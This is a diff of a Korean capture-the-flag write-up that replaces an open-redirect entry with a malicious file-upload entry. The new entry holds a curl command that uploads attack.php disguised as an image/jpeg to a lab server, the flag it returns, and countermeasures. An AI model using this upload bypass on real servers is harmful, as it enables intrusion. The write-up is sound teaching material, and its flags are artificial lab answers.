@@ -1,9 +1,14 @@
-로그인 후 위조된 사이트로 redirect되면 유저 정보가 털릴 수 있다.
+악성 파일을 서버에 업로드해 해킹할 수 있다.
+attack.php를 type=image/jpeg로 위장해 업로드할 수 있다.
 
-<a href="index.php?page=redirect&amp;site=twitter" class="icon fa-twitter"></a>
-site=aasdasd로 바꾸면
+ip="http://<ip-address>"
+curl -o result.html -X POST
+-F ’Upload=Upload’
+-F ’uploaded=@attack.php;type=image/jpeg’
+"$ip/?page=upload"
 
-GOOD JOB HERE IS THE FLAG : B9E775A0291FED784A2D9680FCFAD7EDD6B8CDF87648DA647AAF4BBA288BCAB3
+<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/attack.php succesfully uploaded.</pre>
 
-서버에서 유저를 site로 redirect할 때 올바른 site인지 항상 입력값을 체크해야 한다,
-You need to check that every parameter is valid before redirecting the user to the "site". 
+파일 확장자명 검사
+업로드된 디렉터리가 실행 권한을 가지지 않도록 설정한다.
+파일 사이즈를 제한해 악성 프로그램을 업로드하지 못하도록 한다.
